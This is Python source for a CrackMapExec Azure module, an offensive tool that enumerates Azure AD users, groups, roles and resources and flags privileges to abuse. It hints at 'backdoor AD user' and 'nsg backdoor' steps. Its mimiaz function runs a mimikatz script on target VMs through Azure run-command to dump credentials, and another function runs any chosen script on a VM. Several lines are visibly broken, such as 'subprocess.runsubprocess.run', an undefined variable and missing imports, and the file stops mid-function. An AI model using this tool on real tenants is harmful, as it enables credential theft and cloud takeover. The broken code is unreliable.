# Azure Module
# 
# Interact with AzureAD
# 
# Created by: @awsmhacks

import cme

from cme import config as cfg
from cme.helpers.logger import highlight
from cme.logger import CMEAdapter
from cme.connection import *

from azure.cli.core import get_default_cli
from azure.cli.core._session import ACCOUNT, CONFIG, SESSION
from azure.cli.core._environment import get_config_dir
from azure.cli.core.util import CLIError

import os
import subprocess
import json
import pprint

from pathlib import Path

import pdb

class az(connection):

    def __init__(self, args, db, host):

        self.db = db
        self.args = args
        self.az_cli = None
        self.username = ''
        self.domain = ''
        self.username_full = ''
        self.windows = False
        self.decoder = 'utf-8'

        if args.config:
            self.config1()
        else:
            self.proto_flow()


    @staticmethod
    def proto_args(parser, std_parser, module_parser):
        azure_parser = parser.add_parser('az', help="owning over azure", parents=[std_parser, module_parser])
        azure_parser.add_argument('--full', action='store_true', help='Display full json output for azure commands')
        azure_parser.add_argument('--save', action='store_true', help='Saves just usernames to a file in current directory when doing user enum')

        configgroup = azure_parser.add_argument_group("Configure Azure CLI", "Configure the Azure Connection")
        configgroup.add_argument('--config', action='store_true', help='Setup or re-bind azure connection')

        #commandgroup = azure_parser.add_argument_group("Command Execution", "Options for executing commands")
        #commandgroup.add_argument("-x", metavar="COMMAND", dest='execute', help="execute the specified command")

        enumgroup = azure_parser.add_argument_group("Enumeration", "Azure AD Enumeration Commands")
        enumgroup.add_argument('--user', nargs='?', const='', metavar='USER', help='Enumerate and return all info about a user')
        enumgroup.add_argument('--users', action='store_true', help='Enumerate and return all users')
        enumgroup.add_argument('--group', nargs='?', const='', metavar='GROUP', help='Enumerate and return all members of a group')
        enumgroup.add_argument('--groups', action='store_true', help='Enumerate and return all groups')
        enumgroup.add_argument('--usergroups', nargs='?', const='', metavar='USERSGROUPS', help='Enumerate and return all groups a user is a member of')
        enumgroup.add_argument('--whoami', action='store_true', help='Show information about current identity')

        privgroup = azure_parser.add_argument_group("Privilege Checks", "Get Privs and identify PrivEsc")
        privgroup.add_argument('--suggest', action='store_true', help='Check for potentially abusable permissions')
        privgroup.add_argument('--privs', nargs='?', const='', metavar='USER', help='Check current users privileges')

        resourcegroup = azure_parser.add_argument_group("Resource Checks", "Interact with resources")
        resourcegroup.add_argument('--rgroups', action='store_true', help='List all Resource Groups for current subscription')

        sqlgroup = azure_parser.add_argument_group("SQL Commands", "Interact with SQL Servers and DBs")
        sqlgroup.add_argument('--sql-list', action='store_true', help='List all SQL Servers for current subscription')
        sqlgroup.add_argument('--sql-db-list', nargs='?', const='', metavar='USER', help='List all SQL DBs for current subscription')

        storagegroup = azure_parser.add_argument_group("Storage Commands", "Interact with Storage")
        storagegroup.add_argument('--storage-list', action='store_true', help='List all Storage for current subscription')

        vmgroup = azure_parser.add_argument_group("VM Checks", "Interact with VMs and VM Scale Sets")
        vmgroup.add_argument('--vm-list', nargs='?', const='', metavar='TARGET_VM', help='List all VMs for current subscription or target resource group')
        vmgroup.add_argument('--vmss-list', nargs='?', const='', metavar='TARGET_VMSS', help='List all VM Scale Sets for current subscription or target resource group')

        scriptgroup = azure_parser.add_argument_group("Script Execution", "Execute Scripts on Azure VMs")
        scriptgroup.add_argument('--mimiaz', action='store_true', help='Execute mimikats on a target VM')
        scriptgroup.add_argument('--script', nargs=1, metavar='Full_PATH_TO_SCRIPT', help='Execute Script on a target VM. Use full path to script')
        scriptgroup.add_argument('--vm', nargs=1, metavar='TARGET_VM', help='Used to specify target for Script Execution')
        scriptgroup.add_argument('--rg', nargs=1, metavar='RESOURCEGROUP',help='Used to specify target resource group for Script Execution')

        spngroup = azure_parser.add_argument_group("SPN Checks", "Interact with Service Principals")
        spngroup.add_argument('--spn-list', action='store_true', help='List all SPNs for current subscription')
        spngroup.add_argument('--spn-owner-list', action='store_true', help='List all SPNs for current subscription')
        spngroup.add_argument('--spn-mine', action='store_true', help='List all SPNs owned by current user')
        spngroup.add_argument('--spn', nargs='?', const='', metavar='OBJECTID', help='List all SPNs for current subscription')

        appgroup = azure_parser.add_argument_group("App Checks", "Interact with Apps")
        appgroup.add_argument('--app-list', action='store_true', help='List all Apps for current subscription')


        return parser


    def proto_flow(self):
        self.proto_logger()
        if self.test_connection():
            self.call_cmd_args()

    def proto_logger(self):
        if os.name == 'nt':
            self.windows = True
            self.decoder = 'cp1252'
        self.logger = CMEAdapter(extra={'protocol': 'AZURE',
                                        'host': self.username,
                                        'port': self.domain,
                                        'hostname': 'CLI'})

    def test_connection(self):
        if os.name == 'nt':
            self.windows = True
            self.decoder = 'cp1252'

        if not cfg.AZ_CONFIG_PATH.is_file():
            self.logger.error('Azure connection has not been configured.')
            self.logger.error('Run: cme az --config')
            return False

        # Grab our user/domain and re-init logger.
        # Config should have stored this in the config file.
        f = open(cfg.AZ_CONFIG_PATH,"r")
        data = f.read()
        f.close()
        self.username = data.split()[0].split('@')[0]
        self.domain = data.split()[0].split('@')[1]
        self.username_full = data.split()[0]

        self.proto_logger()
        self.az_cli = get_default_cli()

        return True


    def config1(self):
        self.proto_logger()

        login = subprocess.run(['az','login', '--allow-no-subscriptions'], shell = self.windows, stdout=subprocess.PIPE)
        user = re.findall('([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', str(login.stdout))
        self.logger.success('Logged in as {}'.format(user[0])) #maybe not working
        print(" ")
        subs_resp = subprocess.run(['az','account', 'list', '--query', '[].{SubscriptionName:name, Id:id, TenantId:tenantId}'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        roles_resp = subprocess.run(['az','role', 'assignment', 'list', '--all', '--query', "[?principalName=='$User'].{Role:roleDefinitionName,ResoureGroup:resourceGroup}" ], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    #Show subs
        try:
            subs_resp_json = json.loads(subs_resp.stdout.decode(self.decoder))
            #print("subs: {}".format(subs_resp_json))
            print("Current user has the following subscriptions:")
            print("{:<14}{:<22}   {}".format('','TenantId','SubscriptionName'))

            for sub in subs_resp_json:
                print("{:<36} | {}".format(sub['TenantId'],sub['SubscriptionName']))

        except:
            #self.logger.error("Current user has no subscriptions")
            pass

    # Show roles
        print("")
        try:
            roles_resp_json = json.loads(roles_resp.stdout.decode(self.decoder))
            print("And the following roles: {}".format(roles_resp_json))
        except:
            self.logger.error("Current user has no roles")
            pass


        if not cfg.AZ_PATH.is_dir():
            cfg.AZ_PATH.mkdir(parents=True, exist_ok=True)


        f = open(cfg.AZ_CONFIG_PATH,"w")
        f.write("{}".format(user[0]))
        f.close()
        print('')
        print("               Azure Services now configured, Go get em tiger")
        print('')


    def call_cmd_args(self):
        for k, v in list(vars(self.args).items()):
            if hasattr(self, k) and hasattr(getattr(self, k), '__call__'):
                if v is not False and v is not None:
                    logging.debug('Calling {}()'.format(k))
                    getattr(self, k)()


    def execute(self, command):
        try:
            result = self.az_cli.invoke(command)
            return {
                'result': result.result,
                'error': None
            }
        except CLIError as err:
            return {
                'result': None,
                'error': err.args
            }

###############################################################################

           #       ######              ####### #     # #     # #     #
          # #      #     #             #       ##    # #     # ##   ##
         #   #     #     #             #       # #   # #     # # # # #
        #     #    #     #    #####    #####   #  #  # #     # #  #  #
        #######    #     #             #       #   # # #     # #     #
        #     #    #     #             #       #    ## #     # #     #
        #     #    ######              ####### #     #  #####  #     #

###############################################################################
###############################################################################
#   Network/Domain Enum functions
#
# This section:
#
#
#
#
# (fold next line)
###############################################################################

    def whoami(self):

        my_user_id = subprocess.run(['az','ad', 'signed-in-user', 'show'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            #my_user_id_json = json.loads(my_user_id.stdout.decode('utf-8'))
            my_user_id_json = json.loads(my_user_id.stdout.decode(self.decoder))
        except:
            self.logger.error("Have you setup a session? cme az --config")
            return

        self.logger.info("Getting User Info")

        if self.args.full:
            pprint.pprint(my_user_id_json)
        else:
            self.logger.highlight("{:>26} {}".format('userPrincipalName: ', my_user_id_json['userPrincipalName']))
            self.logger.highlight("{:>26} {}".format('mail: ', my_user_id_json['mail']))
            self.logger.highlight("{:>26} {}".format('mailNickname: ', my_user_id_json['mailNickname']))
            self.logger.highlight("{:>26} {}".format('TelephoneNumber: ', my_user_id_json['telephoneNumber']))
            self.logger.highlight("{:>26} {}".format('objectId: ', my_user_id_json['objectId']))
            self.logger.highlight("{:>26} {}".format('SID: ', my_user_id_json['onPremisesSecurityIdentifier']))
            self.logger.highlight("{:>26} {}".format('isCompromised: ', my_user_id_json['isCompromised']))


    def user(self):
        if self.args.user == '':
            self.logger.info("No user specified, calling whoami")
            self.whoami()
            return

        user_id = subprocess.run(['az','ad', 'user', 'show', '--id', self.args.user], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            user_id_json = json.loads(user_id.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no subscriptions")
            return

        self.db.add_user(user_id_json)

        plans = []
        for plan in user_id_json["assignedPlans"]:
            plans.append(plan["service"])

        self.logger.info("Getting User Info")

        if self.args.full:
            pprint.pprint(user_id_json)
        else:
            self.logger.highlight("{:<26} {}".format('userPrincipalName: ', user_id_json['userPrincipalName']))
            self.logger.highlight("{:<26} {}".format('mail: ', user_id_json['mail']))
            self.logger.highlight("{:<26} {}".format('mailNickname: ', user_id_json['mailNickname']))
            self.logger.highlight("{:<26} {}".format('TelephoneNumber: ', user_id_json['telephoneNumber']))
            self.logger.highlight("{:<26} {}".format('objectId: ', user_id_json['objectId']))
            self.logger.highlight("Plan Memberships: {}".format(plans))
            self.logger.highlight("{:<26} {}".format('SID: ', user_id_json['onPremisesSecurityIdentifier']))
            self.logger.highlight("{:<26} {}".format('isCompromised: ', user_id_json['isCompromised']))


    def usergroups(self):
        users_groups = subprocess.run(['az','ad', 'user', 'get-member-groups', '--id', self.args.usergroups], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            users_groups_json = json.loads(users_groups.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no subscriptions")
            return
        pprint.pprint(users_groups_json)


    def users(self):
        self.logger.info("Getting all users info, this might take a minute")
        user_id = subprocess.run(['az','ad', 'user', 'list'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            user_id_json = json.loads(user_id.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no subscriptions")
            return

        try:
            for user1 in user_id_json:
                self.db.add_user(user1)
        except:
            self.logger.error("add user error tracebak:")
            self.logger.error(format_exc())

        # Do we save usernames
        if self.args.save:
            filename = "{}-users.txt".format(self.domain)
            savefile = open(filename,"w")


        if self.args.full:
            pprint.pprint(user_id_json)

        else:
            usercount = 0
            for user1 in user_id_json:
                if user1['isCompromised'] == None:
                    comp = 'No'
                else:
                    comp = 'Yes'

                if self.args.save:
                    savefile.write("{}\n".format(user1['mail']))

                usercount = usercount + 1
                self.logger.highlight("{:<36}  id:{}  compromised:{} ".format(user1['userPrincipalName'], user1['objectId'], comp))

        if self.args.save:
            savefile.close()
            self.logger.success("Email addresses saved to: {}".format(filename))

        self.logger.success("Total Users Found: {}".format(usercount))
        self.logger.success("All user info complete. Check the db for more details")


    def group(self):
        if self.args.group == '':
            self.logger.error('Must provide a group name or objectID')
            return

        group_list = subprocess.runsubprocess.run(['az','ad', 'group', 'member', 'list', '--group', self.args.group ], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            group_list_json = json.loads(group_list.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no subscriptions")
            return
        pprint.pprint(group_list_json)


    def groups(self):
        group_list = subprocess.runsubprocess.run(['az','ad', 'group', 'list', '--query', '[].{display_name:displayName, description: description, object_id: objectId}'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            group_list_json = json.loads(group_list.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no subscriptions")
            return
        pprint.pprint(group_list_json)


###############################################################################

        ######  ######     ###    #     #       #######  #####   #####
        #     # #     #     #     #     #       #       #     # #     #
        #     # #     #     #     #     #       #       #       #
        ######  ######      #     #     #       #####    #####  #
        #       #   #       #      #   #        #             # #
        #       #    #      #       # #         #       #     # #     #
        #       #     #    ###       #          #######  #####   #####

###############################################################################
###############################################################################
#
#
#
#
###############################################################################

    def suggest(self):

        # Grab user UPN
        self.logger.info("Function is a work-in-progress, try running --privs to see current privileges")
        upn_resp = subprocess.run(['az', 'ad', 'signed-in-user', 'show','--query', '{upn:userPrincipalName}'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        upn_json_obj = json.loads(upn_resp.stdout.decode(self.decoder))
        upn = upn_json_obj['upn']
        logging.debug('upn: {}'.format(upn))

        # GetCurrent users roles
        role_resp = subprocess.run(['az', 'role', 'assignment', 'list', '--assignee', upn, '--query', '[].{roleDefinitionName:roleDefinitionName}'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            role_json_obj = json.loads(role_resp.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no subscriptions")
            return

        role_list = []
        for role in role_json_obj:
            role_list.append(role["roleDefinitionName"])

        if(len(role_list) == 0):
            self.logger.error("No roles found")
            return
        self.logger.success("Found roles for current user!")
        # Get definitions for each role

        tmp_list_perms = []
        for role in role_list:
            role_show = subprocess.run(['az', 'role', 'definition', 'list', '--name', role], shell = self.windows, stdout=subprocess.PIPE)
            role_show_json = json.loads(role_show.stdout.decode(self.decoder))
            tmp_list_perms.append(role_show_json[0]['permissions'][0]['actions'][0])

        all_permissions = [item for sublist in tmp_list_perms for item in sublist]

        self.check_perms(all_permissions)


    def check_perms(self, permissions):

        self.logger.info("Getting potentially abusable global permissions")
        for perm in permissions:
            if("*" in perm):
                self.logger.highlight("Found permission with * - should investigate: {}".format(perm))
            elif("write" in perm):
                self.logger.highlight(" found permission with write - should investigate: {}".format(perm))
            elif("create" in perm):
                self.logger.highlight(" found permission with create - should investigate: {}".format(perm))
            elif("delete" in perm):
                self.logger.highlight(" found permission with delete - should investigate: {}".format(perm))


        self.logger.info("Checking for specific permissions")
        for perm in permissions:

            if("Microsoft.Authorization/*" in perm):
                self.logger.highlight("Current user has permission to do all authorizations actions to resources - consider RBAC manipulation and adding a backdoor AD user")
            if("Microsoft.Authorization/*/read" in perm):
                self.logger.highlight("Current user has permission to read all authorizations - consider running the priv domain enum module")


            if("Microsoft.Compute/*" in perm):
                self.logger.highlight("Current user has permission to run all operations for all resource types - consider using the exfil modules")
            if("Microsoft.Compute/*/read" in perm):
                self.logger.highlight("Current user has permission to read all compute related resources - consider using the various 'list' modules")


            if("Microsoft.Support/*" in perm):
                self.logger.highlight("Current user has permission to issue and submit support tickets")


            if("Microsoft.Resources/*" in perm):
                self.logger.highlight("Current user has permission to run all Microsoft.Resources related commands")
            elif("Microsoft.Resources/deployments/*" in perm):
                self.logger.highlight("Current user has permission to run all deployment related commands")
            elif("Microsoft.Resources/deployments/subscriptions/*" in perm):
                self.logger.highlight("Current user has permission to run all subscription related commands")


            if("Microsoft.Network/*" in perm):
                self.logger.highlight("Current user has permission to run all networking related commands - consider running the net modules")
            elif("Microsoft.Network/networkSecurityGroups/*" in perm):
                self.logger.highlight("Current user has permission to run all nsg related commands - consider running the nsg backdoor module")
            elif("Microsoft.Network/networkSecurityGroups/join/action" in perm):
                self.logger.highlight("Current user has permission to join a network security group ")


            if("Microsoft.Compute/virtualMachines/*" in perm):
                self.logger.highlight("Current user has permission to run virtual machine commands - consider running the various vm modules ")
            elif("Microsoft.Compute/virtualMachines/runCommand/action" in perm or "Microsoft.Compute/virtualMachines/runCommand/*" in perm):
                self.logger.highlight("Current user has permission to run the runCommand virtual machine command - consider running the vm_rce ")


            if("Microsoft.Compute/virtualMachinesScaleSets/*" in perm):
                self.logger.highlight("Current user has permission to run virtual machine scale set commands - consider running the various vmss modules ")
            elif("Microsoft.Compute/virtualMachinesScaleSets/runCommand/action" in perm or "Microsoft.Compute/virtualMachines/runCommand/*" in perm):
                self.logger.highlight("Current user has permission to run the runCommand virtual machine scale set command - consider running the vmss_rce ")


            if("Microsoft.Storage/*" in perm or "Microsoft.Storage/storageAccounts/*" in perm):
                self.logger.highlight("Current user has permission to run all storage account commands - consider running the various stg modules ")
            elif("Microsoft.Storage/storageAccounts/blobServices/containers/*" in perm):
                self.logger.highlight("Current user has permissions to run all storage account container commands - consider running the various stg modules ")
            elif("Microsoft.Storage/storageAccounts/listKeys/action" in perm):
                self.logger.highlight("Current user has permission to read storage account keys - consider running the stg blob scan/download modules ")


            if("Microsoft.Sql/*" in perm):
                self.logger.highlight("Current user has permission to run all sql commands - consider running the various sql modules ")
            elif("Microsoft.Sql/servers/*" in perm):
                self.logger.highlight("Current user has permission to run all sql server commands - consider running the sql server list or the sql backdoor firewall modules ")
            elif("Microsoft.Sql/servers/databases/*" in perm):
                self.logger.highlight("Current user has permission to run all sql database commands - consider running the sql db list ")


    def privs(self):
        # Grab user UPN
        #az ad signed-in-user show
        #az ad user show --id XXXX
        logging.debug("Starting privs")
        if self.args.privs == '':
            upn_resp = subprocess.run(['az', 'ad', 'signed-in-user', 'show','--query', '{upn:userPrincipalName}'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            upn_resp = subprocess.run(['az','ad', 'user', 'show', '--id', self.args.privs, '--query', '{upn:userPrincipalName}'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


        try:
            upn_json_obj = json.loads(upn_resp.stdout.decode(self.decoder))
            upn = upn_json_obj['upn']
            logging.debug("upn {}".format(upn))
        except:
            self.logger.error("Current user has no subscriptions")
            return

        # Get target user's roles
        # az role assignment list --assignee XXX
        role_resp = subprocess.run(['az', 'role', 'assignment', 'list', '--assignee', upn], shell = self.windows, stdout=subprocess.PIPE)
        try:
            role_json_obj = json.loads(role_resp.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no subscriptions")
            return

        role_list = []
        for role in role_json_obj:
            logging.debug("role found: {}".format(role["roleDefinitionName"]))
            role_list.append(role["roleDefinitionName"])

        if(len(role_list) == 0):
            self.logger.error("No roles found")
            return
        self.logger.success("Roles Found!")

        if self.args.full:
            pprint.pprint(role_json_obj)
            return

        self.logger.highlight("{:<20}  | {}".format('    Role', '     Scope'))
        for role in role_json_obj:
            self.logger.highlight("{:<20}  | {}".format(role['roleDefinitionName'], role['scope']))


        # What do roles mean?
        self.logger.success("Info about Roles")
        self.logger.highlight("{:<20}  | {}".format('    Role', '     Description'))
        for role in role_list:
            #print(role.upper())
            #role_show = subprocess.run(['az', 'role', 'definition', 'list', '--name', role, '--query', '[].{actions:permissions[].actions[], dataActions:permissions[].dataActions[], notActions:permissions[].notActions[], notDataActions:permissions[].notDataActions[]}'], shell = self.windows, stdout=subprocess.PIPE)
            role_show = subprocess.run(['az', 'role', 'definition', 'list', '--name', role], shell = self.windows, stdout=subprocess.PIPE)
            role_show_json = json.loads(role_show.stdout.decode(self.decoder))
            for role in role_show_json:
                    self.logger.highlight("{:<20}  |  {} ".format(role['roleName'],
                                                                  (role['description'][:58] + (role['description'][58:] and '..')) ))

###############################################################################

    ######  #######  #####  ####### #     # ######   #####  #######
    #     # #       #     # #     # #     # #     # #     # #
    #     # #       #       #     # #     # #     # #       #
    ######  #####    #####  #     # #     # ######  #       #####
    #   #   #             # #     # #     # #   #   #       #
    #    #  #       #     # #     # #     # #    #  #     # #
    #     # #######  #####  #######  #####  #     #  #####  #######

###############################################################################
###############################################################################
#
#
#
#
###############################################################################


    def rgroups(self):
        # az group list --query
        rgroup = subprocess.run(['az','group', 'list', '--query', '[].{name:name, location: location, id: id}'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            rgroup_json = json.loads(rgroup.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no subscriptions")
            return
        pprint.pprint(rgroup_json)


###############################################################################

                     #####      #####     #
                    #     #    #     #    #
                    #          #     #    #
                     #####     #     #    #
                          #    #   # #    #
                    #     #    #    #     #
                     #####      #### #    #######

###############################################################################
###############################################################################
#
#
#
#
###############################################################################

    def sql_list(self):

        # Get server list
        # az sql server list
        sql_info = subprocess.run(['az', 'sql', 'server', 'list', '--query', '[].{fqdn:fullyQualifiedDomainName, name:name, rgrp: resourceGroup, admin_username:administratorLogin} '], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            sql_info_json = json.loads(sql_info.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no SQL subscriptions")
            return
        pprint.pprint(sql_info_json)


    def sql_db_list(self):

        # Get server list
        # az sql server list
        sql_info = subprocess.run(['az', 'sql', 'server', 'list', '--query', '[].{name:name, rgrp: resourceGroup} '], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            sql_info_json = json.loads(sql_info.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no SQL subscriptions")
            return

        servers = []
        rgrps = []
        for info in sql_info_json:
            servers.append(info['name'])
            rgrps.append(info['rgrp'])
            pprint.pprint(rgroup_json)

        # Get DBs
        # az sql db list --server XXX --resource-group XXX
        for i in range(len(servers)):
            sql_info = subprocess.run(['az', 'sql', 'db', 'list', '--server', servers[i], '--resource-group', rgrps[i], '--query', '[].{collation:collation, name:name, location:location, dbId:databaseId}'], shell = self.windows, stdout=subprocess.PIPE)
            sql_info_json = json.loads(sql_info.stdout.decode(self.decoder))
            print(servers[i], "\n")
            pprint.pprint(sql_info_json)


###############################################################################

         #####  ####### ####### ######     #     #####  #######
        #     #    #    #     # #     #   # #   #     # #
        #          #    #     # #     #  #   #  #       #
         #####     #    #     # ######  #     # #  #### #####
              #    #    #     # #   #   ####### #     # #
        #     #    #    #     # #    #  #     # #     # #
         #####     #    ####### #     # #     #  #####  #######

###############################################################################
###############################################################################
#
#
#
#
###############################################################################

    def storage_list(self):
        # az storage account list
        stg_list = subprocess.run(['az','storage', 'account', 'list', '--query', '[].{resource_group:resourceGroup, storage_types:primaryEndpoints}'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            stg_list_json = json.loads(stg_list.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no Storage subscriptions")
            return
        pprint.pprint(stg_list_json)




###############################################################################

                    #     #          #     #
                    #     #          ##   ##
                    #     #          # # # #
                    #     #          #  #  #
                     #   #           #     #
                      # #            #     #
                       #             #     #

###############################################################################
###############################################################################
#
#
#
#
###############################################################################

    def vm_list(self):

        # Get all vms in subscription
        # az vm list
        if self.args.vm_list == '':
            vm_list = subprocess.run(['az','vm', 'list', '--query', '[].{name:name,os:storageProfile.osDisk.osType, username:osProfile.adminUsername, vm_size:hardwareProfile.vmSize, resource_group: resourceGroup}'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            try:
                vm_list_json = json.loads(vm_list.stdout.decode(self.decoder))
            except:
                self.logger.error("Current user has no VM subscriptions")
                return
            # az vm list-ip-addresses
            vm_iplist = subprocess.run(['az','vm', 'list-ip-addresses', '--query', '[].{name:virtualMachine.name, privateIp:virtualMachine.network.privateIpAddresses, publicIp:virtualMachine.network.publicIpAddresses[].ipAddress}'], shell = self.windows, stdout=subprocess.PIPE)
            try:
                vm_iplist_json = json.loads(vm_iplist.stdout.decode(self.decoder))
            except:
                self.logger.error("Current user has no VM subscriptions")
                return

        else: # Get all vms in specified resource group
            # az vm list -g XXX
            vm_list = subprocess.run(['az','vm', 'list', '-g', self.args.vm_list, '--query', '[].{name:name,os:storageProfile.osDisk.osType, username:osProfile.adminUsername, vm_size:hardwareProfile.vmSize, resource_group: resourceGroup}'], shell = self.windows, stdout=subprocess.PIPE)
            try:
                vm_list_json = json.loads(vm_list.stdout.decode(self.decoder))
            except:
                self.logger.error("Current user has no VM subscriptions")
                return
            # az vm list-ip-addresses -g XXX
            vm_iplist = subprocess.run(['az','vm', 'list-ip-addresses', '-g', self.args.vm_list, '--query', '[].{name:virtualMachine.name, privateIp:virtualMachine.network.privateIpAddresses, publicIp:virtualMachine.network.publicIpAddresses[].ipAddress}'], shell = self.windows, stdout=subprocess.PIPE)
            try:
                vm_iplist_json = json.loads(vm_iplist.stdout.decode(self.decoder))
            except:
                self.logger.error("Current user has no VM subscriptions")
                return

        #combine vm info
        for i in range(len(vm_list_json)):
            vm_list_json[i].update(vm_iplist_json[i])

        if self.args.full:
            pprint.pprint(vm_list_json)
            return

        self.logger.highlight("{:<15}   {:<10}   {:<19}   {:<19}   {:<19} ".format('Name', 'os', 'privateIp', 'publicIp', 'ResourceGroup'))

        for vm in vm_list_json:
            self.logger.highlight("{:<15} | {:<10} | {:<19} | {:<19} | {:<19} ".format(vm['name'],
                                                                                          vm['os'],
                                                                                          vm['privateIp'][0] if vm['privateIp'] else 'Null',
                                                                                          vm['publicIp'][0] if vm['publicIp'] else 'Null',
                                                                                          vm['resource_group'],
                                                                                          ))
# to see if its running, check the output from
# az vm get-instance-view --ids /subscriptions/51eae010-e6eb-48e2-8f01-e89b22a86d26/resourceGroups/RESOURCE1/providers/Microsoft.Compute/virtualMachines/test1

#"statuses": [
#      {
#        "code": "ProvisioningState/succeeded",
#        "displayStatus": "Provisioning succeeded",
#        "level": "Info",
#        "message": null,
#        "time": "2019-12-19T22:49:17.337039+00:00"
#      },
#      {
#        "code": "PowerState/deallocated",
#        "displayStatus": "VM deallocated",
#        "level": "Info",
#        "message": null,
#        "time": null
#      }
#    ],

    def vmss_list(self):

        # Get list of vmss
        # az vmss list
        vmss_list = subprocess.run(['az','vmss', 'list', '--query', '[].{name:name, rgrp:resourceGroup}'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            vmss_list_json = json.loads(vmss_list.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no VM subscriptions")
            return

        for i in range(len(vmss_list_json)):
            # Get vmss info
            vmss_list = subprocess.run(['az','vmss', 'list', '--resource-group', vmss_list_json[i]['rgrp'], '--query', '[].{name:name, vmss_size:sku.name, os_distro:virtualMachineProfile.storageProfile.imageReference.offer,os_version:virtualMachineProfile.storageProfile.imageReference.sku, username:virtualMachineProfile.osProfile.adminUsername, rgrp: resourceGroup}'], shell = self.windows, stdout=subprocess.PIPE)
            vmss_list_json = json.loads(vmss_list.stdout.decode(self.decoder))
            pprint.pprint(vmss_list_json[i])
            # Get vmss IP
            vmss_iplist = subprocess.run(['az','vmss', 'list-instance-public-ips', '--resource-group', vmss_list_json[i]['rgrp'], '--name', vmss_list_json[i]['name'],  '--query', '[].{ipAddress:ipAddress}'], shell = self.windows, stdout=subprocess.PIPE)
            vmss_iplist_json = json.loads(vmss_iplist.stdout.decode(self.decoder))
            pprint.pprint(vmss_iplist_json)

###############################################################################

         #####      #####     ######     ###    ######     #######
        #     #    #     #    #     #     #     #     #       #
        #          #          #     #     #     #     #       #
         #####     #          ######      #     ######        #
              #    #          #   #       #     #             #
        #     #    #     #    #    #      #     #             #
         #####      #####     #     #    ###    #             #


###############################################################################
###############################################################################
#
#
#
#
###############################################################################


    def mimiaz(self):
        # testing with just running coffee
        # need to figure out how we gonna get output back - limited to 4096 this way...
        if self.args.mimiaz and (self.args.vm is None or self.args.rg is None):
            self.logger.error("mimiaz requires --vm and --rg.")
            self.logger.error("Try `cme az --vm-list` to find values")
            return


        mimiaz_path = cfg.PS_PATH / 'mimiaz.ps1'
        mimiaz_script = '@' + str(mimiaz_path)
        self.logger.info("Running mimikatz on {}, please allow at least 30 seconds".format(self.args.vm[0]))

        commander = subprocess.run(['az','vm', 'run-command', 'invoke', '--command-id', 'RunPowerShellScript', '--name', self.args.vm[0], '-g', self.args.rg[0], '--scripts', mimiaz_script], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            commander_json = json.loads(commander.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no VM subscriptions")
            return

        if self.args.full:
            pprint.pprint(commander_json)

        else:
            print(commander_json['value'][0]['message'])


    def script(self):
        # need to figure out how we gonna get output back - limited to 4096 this way...
        if self.args.vm is None or self.args.rg is None:
            self.logger.error("script execution requires a --vm and --rg.")
            self.logger.error("Try `cme az --vm-list` to find values")
            return

        if Path(self.args.script[0]).is_file():
            script_path = '@' + self.args.script[0]
        else:
            self.logger.error("Script not found at {}".format(self.args.script[0]))
            return

        self.logger.info("Running script on {}, please allow at least 30 seconds".format(self.args.vm[0]))

        commander = subprocess.run(['az','vm', 'run-command', 'invoke', '--command-id', 'RunPowerShellScript', '--name', self.args.vm[0], '-g', self.args.rg[0], '--scripts', script_path], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            commander_json = json.loads(commander.stdout.decode(self.decoder))
        except:
            self.logger.error("Script Execution Failed")
            return

        if self.args.full:
            pprint.pprint(commander_json)

        else:
            print(commander_json['value'][0]['message'])

###############################################################################

             #####     ######     #     #
            #     #    #     #    ##    #
            #          #     #    # #   #
             #####     ######     #  #  #
                  #    #          #   # #
            #     #    #          #    ##
             #####     #          #     #

###############################################################################
###############################################################################
#
#
#
#
###############################################################################


    def spn_list(self):
        # az ad sp list --all
        spnn_list = subprocess.run(['az','ad', 'sp', 'list', '--all', '--query', '[].{appDisplayName:appDisplayName, appId:appId, appOwnerTenantId:appOwnerTenantId, publisherName:publisherName}'], shell = self.windows, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        try:
            spn_list_json = json.loads(spnn_list.stdout.decode(self.decoder))
        except:
            self.logger.error("Current user has no VM subscriptions")
            return

        self.logger.info("Getting SPN Info")

        if self.args.full:
            pprint.pprint(spn_list_json)
        else:
            self.logger.highlight("{:<40}  |      {:<32} |   {:<32}   |   publisherName".format('    associated-app', '         appId', '         appOwnerTenantId'))
